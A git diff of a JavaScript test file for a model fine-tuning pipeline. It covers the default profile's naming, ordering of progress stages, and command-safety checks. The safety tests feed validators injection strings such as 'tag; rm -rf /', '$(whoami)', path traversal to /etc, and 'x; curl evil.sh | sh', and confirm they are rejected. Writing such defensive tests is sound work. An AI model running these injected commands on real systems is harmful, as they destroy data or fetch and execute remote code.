@@ -23,7 +23,8 @@ const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), ".."
 const kitApp = path.join(repoRoot, "cli/assets/worker-kits/growthub-custom-workspace-starter-v1/apps/workspace");
 const lib = (rel) => pathToFileURL(path.join(kitApp, "lib", rel)).href;
 
-const { TRAINING_RUNTIME_PROFILES, defaultTrainingProfile, resolveTrainingProfile, buildTrainingRunConfig } = await import(lib("training-runtime-profiles.js"));
+const { TRAINING_RUNTIME_PROFILES, defaultTrainingProfile, resolveTrainingProfile, buildTrainingRunConfig, isSafeModelTag, isContainedPath, ALLOWED_PIPELINE_BINS } = await import(lib("training-runtime-profiles.js"));
+const { TRAINING_PROGRESS_STAGES, progressStageRank, normalizeProgress, nextProgress } = await import(lib("training-run-receipts.js"));
 const { deriveArtifactState, artifactImportComplete, ARTIFACT_TYPES, deriveQuantState, SUPPORTED_QUANTIZATIONS } = await import(lib("training-artifacts.js"));
 const { verifyTunedResponse, deriveEndpointVerification } = await import(lib("training-verification.js"));
 const { classifyRunStatus, deriveTrainingRunState, buildTrainingRunReceipt, trainingRunSourceKey, TRAINING_RUN_SCHEMA } = await import(lib("training-run-receipts.js"));
@@ -35,13 +36,18 @@ const { deriveDistillationPipelineState } = await import(lib("training-ledger.js
 // Profiles
 // --------------------------------------------------------------------------
 
-test("profiles: default is the one-click full pipeline and every profile has an import + verification floor", () => {
+test("profiles: default is the one-click argv pipeline (honest name, no runner distill claim)", () => {
   // One click must produce a served, quantized model, so the default is the
   // full fine-tune → quantize → serve pipeline (not the bare adapter profile).
-  assert.equal(defaultTrainingProfile().id, "unsloth-distill-quantize-pipeline");
+  // Named honestly: the runner does NOT perform a distill pass (dataset
+  // distillation is the pre-runner curation), so the id is not distill-driven.
+  assert.equal(defaultTrainingProfile().id, "unsloth-qlora-quantize-pipeline");
   const pipeline = defaultTrainingProfile();
-  assert.ok(pipeline.commands.some((c) => c.includes("llama-quantize")), "pipeline chains a real quantize step");
-  assert.ok(pipeline.commands.some((c) => c.startsWith("ollama create")), "pipeline chains the ollama create serve step");
+  assert.ok(Array.isArray(pipeline.steps) && pipeline.steps.length >= 5, "pipeline is argv step specs");
+  assert.ok(pipeline.steps.every((s) => Array.isArray(s.args)), "every step is argv (no shell string)");
+  assert.ok(pipeline.steps.some((s) => s.bin === "./llama-quantize"), "chains a real quantize step");
+  assert.ok(pipeline.steps.some((s) => s.bin === "ollama"), "chains the ollama serve step");
+  assert.ok(!pipeline.steps.some((s) => s.stageId === "distilling"), "runner never stamps a distilling stage it does not perform");
   assert.equal(pipeline.importProof.quantProofRequired, true, "pipeline requires quant proof");
   for (const p of TRAINING_RUNTIME_PROFILES) {
     assert.ok(p.id && p.label && p.runnerMode, `${p.id} has identity`);
@@ -717,4 +723,59 @@ test("remediation: none when nothing failed; quality floor exported", () => {
   assert.equal(rem.hasRemedies, false);
   assert.equal(rem.top, null);
   assert.equal(HIGH_QUALITY_TRACE_FLOOR, 50);
+});
+
+// --------------------------------------------------------------------------
+// Canonical progress vocabulary + monotonicity (adversarial-review gaps 2-4)
+// --------------------------------------------------------------------------
+
+test("progress: canonical 0-7 stage vocabulary is complete and ordered", () => {
+  assert.deepEqual(TRAINING_PROGRESS_STAGES.map((s) => s.id),
+    ["preflight", "distilling", "fine-tuning", "converting", "quantizing", "serving", "verifying", "complete"]);
+  assert.deepEqual(TRAINING_PROGRESS_STAGES.map((s) => s.rank), [0, 1, 2, 3, 4, 5, 6, 7]);
+  assert.ok(TRAINING_PROGRESS_STAGES.every((s) => s.proofKind), "each stage names its proof kind");
+  assert.equal(progressStageRank("quantizing"), 4);
+  assert.equal(progressStageRank("bogus"), -1);
+  const n = normalizeProgress({ stage: "serving", pct: 300 });
+  assert.equal(n.stageId, "serving"); assert.equal(n.stageRank, 5); assert.equal(n.pct, 100);
+});
+
+test("progress: monotonic — a later write may only advance, stale writes refused", () => {
+  const p2 = nextProgress({ stageId: "fine-tuning", pct: 40 }, { stageId: "converting", pct: 10 });
+  assert.equal(p2.stageId, "converting", "higher stageRank wins even at lower pct");
+  const stale = nextProgress({ stageId: "quantizing", pct: 50 }, { stageId: "fine-tuning", pct: 99 });
+  assert.equal(stale.stageId, "quantizing", "a regressing stageRank is refused");
+  const samePctBack = nextProgress({ stageId: "fine-tuning", pct: 80 }, { stageId: "fine-tuning", pct: 20 });
+  assert.equal(samePctBack.pct, 80, "within a stage, a lower pct is refused");
+  const counterUp = nextProgress({ stageId: "distilling", pct: 10, counter: 5 }, { stageId: "distilling", pct: 9, counter: 20 });
+  assert.equal(counterUp.counter, 20, "within a stage, a higher counter advances");
+});
+
+// --------------------------------------------------------------------------
+// Command safety — no shell-string execution of user-influenced values (gap 1)
+// --------------------------------------------------------------------------
+
+test("command safety: model tags + workspace-contained paths validated", () => {
+  assert.equal(isSafeModelTag("workspace-local-tuned-v1"), true);
+  assert.equal(isSafeModelTag("q4_k_m"), true);
+  assert.equal(isSafeModelTag("tag; rm -rf /"), false, "shell metachars rejected");
+  assert.equal(isSafeModelTag("$(whoami)"), false);
+  assert.equal(isContainedPath("./artifacts/x"), true);
+  assert.equal(isContainedPath("/etc/passwd"), false, "absolute path rejected");
+  assert.equal(isContainedPath("../../secrets"), false, "traversal rejected");
+});
+
+test("command safety: pipeline resolves to argv steps; injection makes it not-ready", () => {
+  const ok = buildTrainingRunConfig({ profileId: "unsloth-qlora-quantize-pipeline", baseModel: "gemma3", datasetPath: "ds.jsonl", outputModelTag: "gh-tuned-v1", artifactPath: "./artifacts/gh", quantization: "q4_k_m" });
+  assert.ok(Array.isArray(ok.steps) && ok.steps.length >= 5, "argv steps present");
+  assert.ok(ok.steps.every((s) => ALLOWED_PIPELINE_BINS.includes(s.bin)), "every bin is allowlisted");
+  assert.ok(ok.steps.every((s) => Array.isArray(s.args)), "args are argv arrays, not shell strings");
+  assert.equal(ok.commandSafety.ok, true);
+  assert.equal(ok.ready, true);
+  // Injection attempt in a value → safety fails → run config is NOT ready.
+  const evil = buildTrainingRunConfig({ profileId: "unsloth-qlora-quantize-pipeline", baseModel: "gemma3", datasetPath: "ds.jsonl", outputModelTag: "x; curl evil.sh | sh", artifactPath: "../../etc", quantization: "q4_k_m" });
+  assert.equal(evil.commandSafety.ok, false, "unsafe tag + path flagged");
+  assert.equal(evil.ready, false, "unsafe run config cannot fire");
+  assert.ok(evil.commandSafety.reasons.some((r) => /model tag/.test(r)));
+  assert.ok(evil.commandSafety.reasons.some((r) => /artifactPath/.test(r)));
 });
